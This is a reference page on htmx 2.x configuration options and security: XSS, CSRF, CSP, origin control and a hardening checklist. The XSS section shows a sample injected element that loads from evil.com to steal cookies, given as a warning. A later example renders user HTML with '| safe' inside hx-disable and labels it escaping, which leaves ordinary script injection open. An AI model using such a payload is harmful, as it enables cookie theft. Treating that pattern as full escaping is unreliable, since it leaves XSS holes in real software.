# htmx — Configuration & Security

> Source: [htmx.org/docs/#config](https://htmx.org/docs/#config) | Version: 2.0.x

## Table of Contents

- [Configuration Methods](#configuration-methods)
- [Complete Configuration Reference](#complete-configuration-reference)
- [Security Model](#security-model)
- [XSS Prevention](#xss-prevention)
- [CSRF Protection](#csrf-protection)
- [Content Security Policy](#content-security-policy)
- [Request Origin Control](#request-origin-control)
- [Sensitive Data Protection](#sensitive-data-protection)
- [Security Hardening Checklist](#security-hardening-checklist)
- [Common Pitfalls](#common-pitfalls)

## Configuration Methods

### JavaScript

```javascript
htmx.config.defaultSwapStyle = 'outerHTML';
htmx.config.historyCacheSize = 20;
htmx.config.selfRequestsOnly = true;
```

### Meta Tag (Declarative)

```html
<head>
    <meta name="htmx-config" content='{
        "defaultSwapStyle": "outerHTML",
        "historyCacheSize": 20,
        "selfRequestsOnly": true,
        "includeIndicatorStyles": true
    }'>
</head>
```

The meta tag approach is useful when you want configuration without writing JavaScript.

## Complete Configuration Reference

### Request & Response

| Option | Default | Description |
|--------|---------|-------------|
| `defaultSwapStyle` | `"innerHTML"` | Default swap strategy |
| `defaultSwapDelay` | `0` | Delay (ms) before swapping |
| `defaultSettleDelay` | `20` | Delay (ms) before settling |
| `timeout` | `0` | Request timeout in ms (0 = no timeout) |
| `withCredentials` | `false` | Include cookies in cross-origin requests |
| `methodsThatUseUrlParams` | `["get","delete"]` | HTTP methods using URL params instead of body |
| `getCacheBusterParam` | `false` | Add cache-buster param to GET requests |

### History

| Option | Default | Description |
|--------|---------|-------------|
| `historyEnabled` | `true` | Enable/disable history |
| `historyCacheSize` | `10` | Number of DOM snapshots to cache |
| `refreshOnHistoryMiss` | `false` | Full reload on cache miss |
| `historyRestoreAsHxRequest` | `true` | Send HX-Request on history restore |

### CSS Classes

| Option | Default | Description |
|--------|---------|-------------|
| `indicatorClass` | `"htmx-indicator"` | Class for loading indicators |
| `requestClass` | `"htmx-request"` | Class applied during requests |
| `addedClass` | `"htmx-added"` | Class for newly added elements |
| `settlingClass` | `"htmx-settling"` | Class during settle phase |
| `swappingClass` | `"htmx-swapping"` | Class during swap phase |
| `includeIndicatorStyles` | `true` | Inject default indicator CSS |

### Behavior

| Option | Default | Description |
|--------|---------|-------------|
| `scrollBehavior` | `"instant"` | Scroll behavior: `"instant"` or `"smooth"` |
| `defaultFocusScroll` | `false` | Scroll to focused element after swap |
| `scrollIntoViewOnBoost` | `true` | Scroll to top on boosted navigation |
| `ignoreTitle` | `false` | Ignore `<title>` tags in responses |
| `disableInheritance` | `false` | Disable attribute inheritance globally |
| `allowNestedOobSwaps` | `true` | Process OOB swaps inside OOB swaps |

### Security

| Option | Default | Description |
|--------|---------|-------------|
| `selfRequestsOnly` | `true` | Only allow same-origin requests |
| `allowEval` | `true` | Allow `eval()` (event filters, hx-on, js: prefix) |
| `allowScriptTags` | `true` | Process `<script>` tags in responses |
| `inlineScriptNonce` | `""` | Nonce for inline scripts (CSP) |
| `inlineStyleNonce` | `""` | Nonce for inline styles (CSP) |

### Settling

| Option | Default | Description |
|--------|---------|-------------|
| `attributesToSettle` | `["class","style","width","height"]` | Attributes transferred during settle |
| `useTemplateFragments` | `false` | Use `<template>` for fragment parsing |

### WebSocket

| Option | Default | Description |
|--------|---------|-------------|
| `wsReconnectDelay` | `"full-jitter"` | WebSocket reconnect strategy |
| `wsBinaryType` | `"blob"` | WebSocket binary data type |

### View Transitions

| Option | Default | Description |
|--------|---------|-------------|
| `globalViewTransitions` | `false` | Enable View Transitions API globally |

### Response Handling

```javascript
htmx.config.responseHandling = [
    { code: "204", swap: false },
    { code: "[23]..", swap: true },
    { code: "[45]..", swap: false, error: true },
    { code: "...", swap: false }
];
```

Each entry: `code` (regex), `swap` (bool), `error` (bool), `ignoreTitle`, `select`, `target`, `swapOverride`.

## Security Model

htmx's primary security rule: **Escape all untrusted, third-party content.** Since htmx attributes in HTML can trigger HTTP requests and DOM manipulation, user-generated content must be sanitized.

### Server-Side Responsibility

The server is the security boundary. htmx trusts whatever HTML the server sends. Your server must:

1. Escape user-generated content before rendering it in HTML
2. Validate all incoming requests (not just form submissions)
3. Include CSRF tokens for state-changing requests
4. Authenticate and authorize every request

## XSS Prevention

### The Risk

If an attacker can inject HTML containing `hx-*` attributes, they can issue arbitrary requests:

```html
<!-- Dangerous if user input is not escaped -->
<div hx-get="https://evil.com/steal?cookie=..." hx-trigger="load">
    Malicious content
</div>
```

### Prevention: Escape All User Content

```python
# Django: auto-escapes by default in templates
{{ user_input }}  # Safe: auto-escaped

# FastAPI with Jinja2: auto-escapes by default
{{ user_input }}  # Safe: auto-escaped

# NEVER use |safe or markupsafe.Markup on user input
```

### hx-disable

Block htmx processing on untrusted content:

```html
<div class="user-content" hx-disable>
    <!-- No hx-* attributes will be processed here, even if present -->
    {{ user_generated_html | safe }}
</div>
```

### Disable Script Processing

```javascript
htmx.config.allowScriptTags = false;
```

### Disable Eval

Disable JavaScript evaluation in event filters, `hx-on`, and `js:` prefix:

```javascript
htmx.config.allowEval = false;
```

## CSRF Protection

htmx does not include CSRF tokens automatically. You must configure them.

### Pattern 1: hx-headers on Body

```html
<!-- Django -->
<body hx-headers='{"X-CSRFToken": "{{ csrf_token }}"}'>

<!-- Flask with WTForms -->
<body hx-headers='{"X-CSRFToken": "{{ csrf_token() }}"}'>

<!-- Rails -->
<body hx-headers='{"X-CSRF-Token": "<%= form_authenticity_token %>"}'>
```

### Pattern 2: JavaScript Event

```javascript
document.addEventListener('htmx:configRequest', function(event) {
    event.detail.headers['X-CSRFToken'] =
        document.querySelector('[name=csrfmiddlewaretoken]')?.value
        || getCookie('csrftoken');
});
```

### Pattern 3: hx-on on Body

```html
<body hx-on:htmx:config-request="
    event.detail.headers['X-CSRFToken'] = getCookie('csrftoken');
">
```

## Content Security Policy

### Script Nonces

If your CSP requires nonces for inline scripts:

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-abc123'">

<meta name="htmx-config" content='{
    "inlineScriptNonce": "abc123",
    "inlineStyleNonce": "abc123"
}'>
```

htmx will add the nonce to any inline `<script>` and `<style>` tags it processes from responses.

### Strict CSP with htmx

```
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'nonce-{random}';
    connect-src 'self';
```

### Disabling Eval for CSP

If your CSP blocks `unsafe-eval`:

```javascript
htmx.config.allowEval = false;
```

This disables: trigger filters (`[ctrlKey]`), `hx-on:*` with JavaScript, and `js:` prefix in `hx-vals`.

## Request Origin Control

### Self-Requests Only (Default)

```javascript
htmx.config.selfRequestsOnly = true;  // default
// Only allows requests to the same origin
```

### URL Validation Event

For fine-grained control:

```javascript
document.addEventListener('htmx:validateUrl', function(event) {
    var url = event.detail.url;

    // Allow specific external domains
    var allowed = ['api.myapp.com', 'cdn.myapp.com'];
    if (!event.detail.sameHost && !allowed.includes(url.hostname)) {
        event.preventDefault();
        console.warn('Blocked request to:', url.href);
    }
});
```

### Allowing Cross-Origin Requests

```javascript
htmx.config.selfRequestsOnly = false;
// WARNING: opens up to CSRF if not properly protected
```

## Sensitive Data Protection

### Disable History Cache for Sensitive Pages

```html
<div hx-history="false">
    <!-- This page's DOM is NOT cached in localStorage -->
    <h2>Account Settings</h2>
    <p>Credit Card: **** **** **** 4242</p>
</div>
```

### Disable History Cache Globally

```javascript
htmx.config.historyCacheSize = 0;
```

### Clear History Cache

```javascript
// Programmatically clear the cache
localStorage.removeItem('htmx-history-cache');
```

## Security Hardening Checklist

```javascript
// Production security settings
htmx.config.selfRequestsOnly = true;     // Block cross-origin requests
htmx.config.allowScriptTags = false;      // Don't process <script> in responses
htmx.config.allowEval = false;            // No eval() usage (tightest CSP)
htmx.config.historyCacheSize = 0;         // No localStorage caching (if sensitive)
```

```html
<!-- Escape user content -->
<div hx-disable>{{ user_html }}</div>

<!-- CSRF on all requests -->
<body hx-headers='{"X-CSRFToken": "{{ token }}"}'>

<!-- CSP with nonces -->
<meta name="htmx-config" content='{"inlineScriptNonce": "{{ nonce }}"}'>
```

### Server-Side Checklist

1. Always escape user-generated content before rendering
2. Include CSRF tokens for POST/PUT/PATCH/DELETE
3. Validate the `HX-Request` header (it can be spoofed — don't rely on it for security)
4. Set `Vary: HX-Request` if responses differ based on the header
5. Use HTTPS in production
6. Set appropriate CORS headers
7. Rate-limit endpoints that htmx polls

## Common Pitfalls

1. **Trusting HX-Request header** — it can be spoofed. Use it for response format (fragment vs. full page), not for authorization.

2. **Not escaping user content** — the #1 htmx security issue. User-generated HTML with `hx-get` can make arbitrary requests.

3. **Forgetting CSRF** — htmx uses AJAX, which means POST requests bypass `<form>` CSRF mechanisms unless you explicitly add tokens.

4. **localStorage with sensitive data** — history cache stores DOM snapshots in localStorage. Disable for pages with PII/secrets.

5. **Cross-origin with credentials** — `withCredentials: true` + `selfRequestsOnly: false` is dangerous. Ensure proper CORS configuration.

6. **Open redirect via HX-Redirect** — validate redirect URLs on the server side, not client side.
